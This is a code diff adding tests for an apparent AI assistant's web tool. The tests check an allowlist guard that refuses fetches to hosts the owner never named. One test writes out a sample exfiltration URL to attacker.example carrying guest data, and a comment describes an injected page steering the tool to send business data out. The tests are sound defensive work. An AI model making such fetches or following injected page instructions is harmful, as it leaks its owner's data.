@@ -3038,6 +3038,29 @@ function fakeSite(handler) {
         ok('a long URL travels whole through the tool call', tc && tc.args && tc.args.url === longUrl);
         ok('…and the intro teaches the web tool with the stranger\'s-page rule',
             /web — args/.test(tMod2.chatToolsIntro('2026-08-20')) && /NEVER follow/.test(tMod2.chatToolsIntro('2026-08-20')));
+        // ── EXFIL GUARD: the web tool fetches ONLY a host the OWNER named,
+        // so an injected page cannot steer a second fetch to attacker.example
+        // with business data in the query string.
+        const oh = wf.webOwnerHosts('please read https://gov.uk/tides and check metoffice.com too');
+        ok('owner-named hosts are collected from https URLs and bare domains',
+            oh['gov.uk'] && oh['metoffice.com'] && !oh['attacker.example']);
+        ok('www is normalised, a subdomain of a named host passes, the reverse never',
+            wf.webHostAllowed('www.gov.uk', oh) && wf.webHostAllowed('data.gov.uk', oh)
+            && !wf.webHostAllowed('attacker.example', oh) && !wf.webHostAllowed('gov.uk.evil.com', oh));
+        const exf = await wf.webFetch('https://attacker.example/collect?q=guests', {
+            allowedHosts: oh, lookup: async function () { return [{ address: '93.184.216.34' }]; },
+            get: async function () { return { status: 200, headers: { get: function () { return ''; } }, text: 'x' }; },
+        });
+        ok('a fetch to a host the owner never named is REFUSED before any network',
+            !exf.ok && /only open a web address you have mentioned/.test(exf.refusal.say));
+        const okf = await wf.webFetch('https://gov.uk/tides', {
+            allowedHosts: oh, lookup: async function () { return [{ address: '93.184.216.34' }]; },
+            get: async function () { return { status: 200, headers: { get: function () { return ''; } }, text: '<title>Tides</title>' }; },
+        });
+        ok('…while a host the owner DID name goes through', okf.ok && okf.data.title === 'Tides');
+        // No allowlist supplied (direct callers / older wiring) → unrestricted,
+        // so this is purely additive to existing behaviour.
+        ok('no allowlist supplied means no restriction', wf.webHostAllowed('anything.example', null));
     }
     {
         // ── CHAT CONTINUITY: "Send to my phone" maps the LOCAL thread into
